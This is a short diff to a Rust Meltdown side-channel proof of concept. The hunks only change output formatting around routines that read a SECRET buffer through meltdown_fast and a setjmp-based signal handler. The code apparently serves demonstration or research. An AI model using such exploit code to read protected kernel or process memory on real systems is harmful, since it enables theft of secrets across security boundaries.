@@ -148,7 +148,7 @@ pub fn handle_signal() {
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
-		print!(" {}\033[1D", iteration % 10);
+		print!(" {}\x1b[1D\x1b[1D", iteration % 10);
 		unsafe {
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
@@ -325,12 +325,13 @@ pub fn main() {
 	while index < SECRET.len() {
 		let pointer = SECRET[index..index].as_ptr();
 		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
-		print!("{}", value);
+		print!("{}", value as u8 as char);
 		/*unsafe {
 			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
 		}*/
 		index += 1;
 	}
+	println!("");
 	
 	println!("Done. Deallocating now!");
 	unsafe {
